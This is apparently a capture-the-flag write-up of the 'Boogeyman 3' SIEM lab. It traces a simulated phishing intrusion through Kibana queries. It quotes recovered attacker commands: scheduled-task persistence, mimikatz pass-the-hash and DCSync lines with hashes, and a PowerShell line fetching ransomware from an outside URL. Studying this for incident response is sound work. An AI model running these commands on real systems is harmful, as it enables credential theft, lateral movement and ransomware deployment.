# Boogeyman 3

## Challenge Overview

The challenge provides a **Kibana/Elastic SIEM environment** containing Windows endpoint logs from Quick Logistics LLC.
The CEO, Evan Hutchinson, opened a phishing attachment — triggering a full attack chain from initial access through lateral movement to ransomware deployment.

**Incident window:** August 29–30, 2023

**Setup:** Log in to the Lab Machine URL with `elastic:elastic`, open Discover, select the `winlogbeat-*` index, and set the time range to Aug 29–30 2023.

Useful columns to add:
```
@timestamp, host.name, user.name, process.name, process.pid,
process.parent.name, process.command_line, destination.ip,
destination.port, event.code
```

---

## Investigation

### Step 1 — Find the Stage 1 Payload PID

Search for the phishing attachment filename:

```
ProjectFinancialSummary_Q3.pdf
```

4 events are returned. The earliest event reveals the PID of the process that executed the initial stage 1 payload (`mshta.exe`).

### Step 2 — Stage 1 File Implant

The payload used `xcopy` to copy itself to a writable location:

```
"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat
C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
```

### Step 3 — Implanted File Execution

Search:
```
process.name : "rundll32.exe" AND process.parent.name : "mshta.exe"
```

```
"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

### Step 4 — Persistence via Scheduled Task

Search:
```
process.name : "powershell.exe" AND process.parent.name : "mshta.exe"
```

The script registered a scheduled task named **Review** to run `review.dat` daily at 06:00:

```powershell
$A = New-ScheduledTaskAction -Execute 'rundll32.exe'
     -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'
$T = New-ScheduledTaskTrigger -Daily -At 06:00
Register-ScheduledTask Review -InputObject $D -Force
```

✅ Scheduled task name: **Review**

### Step 5 — C2 Connection

Search for network events from `rundll32.exe`:

```
process.name : "rundll32.exe" AND event.code : "3"
```

✅ C2 address: **`165.232.170.151:80`**

### Step 6 — UAC Bypass

Searching Event ID 1 (process creation) events revealed the UAC bypass tool:

✅ Process: **`fodhelper.exe`**

### Step 7 — Credential Dumping Tool Download

```
process.command_line : *github*
```

The attacker downloaded a credential dumping tool from GitHub.

### Step 8 — Dumped Credentials (Machine 1)

```
process.command_line : *mimikatz*
```

Mimikatz was executed with a pass-the-hash command:

```
"mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS
/ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit
```

✅ Credentials: **`itadmin:F84769D250EB95EB2D7D8B4A1C5613F2`**

### Step 9 — Remote File Share Enumeration

```
process.name : "powershell.exe"
```

```powershell
cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1
```

✅ File accessed: **`IT_Automation.ps1`**

### Step 10 — New Credentials Discovered

```
process.command_line : *credential*
```

The script contained hardcoded credentials:

```powershell
$credential = (New-Object PSCredential -ArgumentList (
    'QUICKLOGISTICS\allan.smith',
    (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force)
))
Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}
```

✅ Credentials: **`allan.smith:Tr!ckyP@ssw0rd987`**

### Step 11 — Lateral Movement Target

✅ Hostname: **`WKSTN-1327`**

### Step 12 — Parent Process on Second Machine

```
winlog.event_id : 1 AND host.hostname : WKSTN-1327
```

✅ Parent process: **`wsmprovhost.exe`** (Windows Remote Management)

### Step 13 — Dumped Credentials (Machine 2)

```
host.name : *WKSTN-1327* AND process.executable : *mimikatz*
```

```
"mimikatz.exe" "sekurlsa::pth /user:administrator /domain:quicklogistics.org
/ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit
```

✅ Credentials: **`administrator:00f80f2538dcb54e7adc715c0e7091ec`**

### Step 14 — DCSync Attack on Domain Controller

```
process.command_line : *dcsync*
```

```
"mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit
```

✅ Additional account dumped: **`backupda`**

### Step 15 — Ransomware Download Link

```
process.command_line : *ransomboogey*
```

```powershell
Invoke-Command -ComputerName WKSTN-0051.quicklogistics.org -ScriptBlock {
    iwr http://ff.sillytechninja.io/ransomboogey.exe
}
```

✅ Ransomware URL: **`http://ff.sillytechninja.io/ransomboogey.exe`**

---

## Attack Chain Summary

```
Phishing email → mshta.exe (stage 1)
→ xcopy review.dat → rundll32 execution
→ Scheduled task persistence
→ C2 connection (165.232.170.151:80)
→ UAC bypass (fodhelper.exe)
→ Mimikatz credential dump
→ Lateral movement to WKSTN-1327 (allan.smith)
→ Second credential dump (administrator)
→ DCSync on domain controller (backupda)
→ Ransomware deployment (ransomboogey.exe)
```

---

## Key Takeaway

> **A single phishing email with an ISO attachment enabled a full domain compromise.** The attacker moved from initial access through privilege escalation, credential dumping, lateral movement, and domain controller takeover — all within hours. Elastic/Kibana SIEM with Sysmon (Event IDs 1 and 3) provides the visibility needed to trace every step of the kill chain.
```
